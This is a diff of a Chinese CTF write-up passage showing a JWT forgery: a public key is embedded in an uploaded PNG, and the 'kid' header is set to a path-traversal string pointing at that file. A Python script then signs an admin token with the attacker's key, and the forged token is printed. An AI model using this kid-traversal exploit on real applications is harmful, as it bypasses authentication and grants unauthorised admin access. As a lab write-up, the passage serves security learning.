@@ -70,21 +70,27 @@ TEiGjWVM5w+Ea21IUsE2O2CIG1CePqUI2DSujYCo7Oc=
 实践出真知!!!,只要不破坏pem文件格式也可以解析
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414025437.png)
 
-类似于图片马的制作
-生成一个公私钥,然后使用私钥加密
-![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414031105.png)
+类似于图片马的制作,在一个图片中间把公钥加上去
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414035316.png)
 
+
+照着原来的代码写一个加密,注意在linux上跑...
+```python
+import jwt
+from pathlib import Path
+
+
+payload={"user_id":1,"admin":True}
+
+def encode(payload, public_key: Path, private_key: Path):
+        key = private_key.read_bytes()
+        return jwt.encode(payload=payload, key=key, algorithm="RS256", headers={"kid": str(public_key)})
+print(encode(payload=payload,public_key=Path('../../../../../../uploads/2b170008-668c-4810-9b38-3815912a675b.png'),private_key=Path('/tmp/private.pem')))
 ```
-eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6bnVsbCwiaWF0IjoxNzEzMDM1NDA0fQ.h1QmHfqXz0YHlhOjqgohwpzfQ4ugCkHS9fQaBOmcqyg237NctYZ-SS4H0oRYhM8VEywSgmGohIpNrM-Pw7dU8jedoxru9stQYbCoIKyB9tQFFkLbBXysBLp7N3UoxPnzHxD5ilhvaWaXy2v1orNXs1YYwIOJ4gE_Au3GUXEOlBY
-```
 
-然后修改头部
-`{'alg': 'RS256', 'kid': '../../../../../../../../uploads/cf00f2ee-4886-4d6c-8e4c-30bde26c76f4.png', 'typ': 'JWT'}`
-base64后为
-`eydhbGcnOiAnUlMyNTYnLCAna2lkJzogJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvY2YwMGYyZWUtNDg4Ni00ZDZjLThlNGMtMzBiZGUyNmM3NmY0LnBuZycsICd0eXAnOiAnSldUJ30=`
+output`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvMmIxNzAwMDgtNjY4Yy00ODEwLTliMzgtMzgxNTkxMmE2NzViLnBuZyJ9.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6dHJ1ZX0.fBuVTPsTuxKvVfpTUsi8qcDt07TqNZaORzH936DSgCT_xn5AtblipxDWKIHCbRRQyb1E2fwCQI7S9ORYNEb71PCrAHSop2akS084yIssIyVM3JGCVKpNrOvt-ta6Ua3TemAcpuI3Jx8jE_HTIot0rdBahS_DVXuZ8-NHn2YqIOo`
 
-最终得到
-eydhbGcnOiAnUlMyNTYnLCAna2lkJzogJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvY2YwMGYyZWUtNDg4Ni00ZDZjLThlNGMtMzBiZGUyNmM3NmY0LnBuZycsICd0eXAnOiAnSldUJ30.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6bnVsbCwiaWF0IjoxNzEzMDM1NDA0fQ.h1QmHfqXz0YHlhOjqgohwpzfQ4ugCkHS9fQaBOmcqyg237NctYZ-SS4H0oRYhM8VEywSgmGohIpNrM-Pw7dU8jedoxru9stQYbCoIKyB9tQFFkLbBXysBLp7N3UoxPnzHxD5ilhvaWaXy2v1orNXs1YYwIOJ4gE_Au3GUXEOlBY
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414034815.png)
 
 
 # reverse
